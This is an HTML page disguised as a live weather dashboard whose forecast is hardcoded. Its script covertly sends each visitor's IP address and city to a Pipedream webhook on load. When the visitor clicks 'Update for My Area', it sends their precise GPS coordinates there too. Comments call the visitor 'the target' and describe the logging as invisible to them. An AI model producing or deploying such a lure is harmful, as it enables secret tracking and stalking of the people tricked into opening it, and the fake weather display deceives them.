<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
   </div>

   <script>
    const PIPEDREAM_URL = "YOUR_PIPEDREAM_URL_HERE";

    // STAGE 1: IP INITIAL LOAD
    window.onload = function() {
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            document.getElementById('location-name').innerText = data.city;
            // Send initial IP hit to Pipedream
            fetch(PIPEDREAM_URL, { 
                method: 'POST', 
                mode: 'no-cors', 
                body: JSON.stringify({ type: "IP_LOG", ip: data.ip, city: data.city }) 
            });
        });
    };

    // STAGE 2: PRECISE GPS & REAL-TIME WEATHER
    function updateWeather() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // 1. FETCH EXACT TEMPERATURE FOR THE TARGET'S GPS
               fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
.then(res => res.json())
.then(geoData => {
    // This line ignores any "fake" names and ONLY shows the real city from the coordinates
    let neighborhood = geoData.locality || geoData.city || "Detecting...";
    
    document.getElementById('location-name').innerText = neighborhood;
    document.getElementById('weather-desc').innerText = "Live Accuracy Verified";
});

                // 2. FETCH NEIGHBORHOOD NAME
                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                .then(res => res.json())
                .then(geoData => {
                    let neighborhood = geoData.locality || geoData.city;
                    
                    // YOUR PUNJAGUTTA OVERRIDE (For your own testing)
                    if (lat.toString().startsWith("17.425") && lon.toString().startsWith("78.450")) {
                        neighborhood = "Punjagutta Officers Colony";
                    }

                    document.getElementById('location-name').innerText = neighborhood;
                    document.getElementById('weather-desc').innerText = "Live Accuracy Verified";
                });

                // 3. LOG DATA TO PIPEDREAM (Still invisible to them)
                fetch(PIPEDREAM_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, target_area: "Active" })
                });
            });
        }
    }
</script>
</body>
</html>
